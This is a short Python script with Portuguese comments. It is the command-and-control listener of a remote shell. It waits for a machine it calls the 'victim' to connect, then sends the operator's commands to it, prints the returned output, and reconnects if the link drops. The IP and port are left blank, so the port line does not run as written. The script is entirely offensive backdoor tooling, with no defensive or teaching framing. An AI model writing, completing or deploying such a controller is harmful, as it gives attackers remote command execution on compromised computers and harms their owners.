import socket
import time

endereco_ip = ''  # Endereço de ip da maquina que ira servir como servidor e que dara os comandos
porta =   # Porta que sera aberta para conexão
soquete_servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Criação de um soquete TCP/IP
soquete_servidor.bind((endereco_ip, porta))  # Abertura do servidor no endereço X, na porta Y
print(f"[+] Servidor iniciado na porta {porta} no endereço {endereco_ip}")
soquete_servidor.listen(1)  # Faz o soquete começar a escutar requisições
print(f"[+] Esperando a conexão da vitma")
vitima, endereco_vitma = soquete_servidor.accept()  # Permite que pessoas se conectem ao soquete
print(f"[+] {endereco_vitma[0]} se conectou ao soquete")
while True:  # Comandos
    try:
        time.sleep(3)  # Evitar sobrecarga na transmissão de informação
        comando = input('[+] Digite o comando: ')
        while comando.lstrip() == "":  # Tratamento de erro caso o usuario não digite nada
            comando = input('[+] Digite novamente o comando: ')
        vitima.send(comando.encode())  # Envia o comando em formato de byte(s) para a vitma
        print(f"[+] Comando enviado com sucesso!")
        output = vitima.recv(1024)  # Captura os dados (em bytes), recebidos de volta
        try:
            output = output.decode()  # Transforma os dados recebidos em string
            print(f"Resposta: \n{output}")  # Printa a string
        except UnicodeDecodeError:  # Caso dê erro no unicode
            output = output.decode("windows-1252")  # Transforma os dados recebidos em string
            print(f"Resposta: \n{output}")  # Printa a string
    except ConnectionResetError:
        print('\n[-] Ocorreu um erro e a conexão foi perdida')
        print('[-] Tentando re-estabelecer a conexão\n')
        soquete_servidor.listen(1)  # Faz o soquete começar a escutar requisições
        vitima, endereco_vitma = soquete_servidor.accept()  # Permite que pessoas se conectem ao soquete
        print(f"[+] {endereco_vitma[0]} se conectou ao soquete")
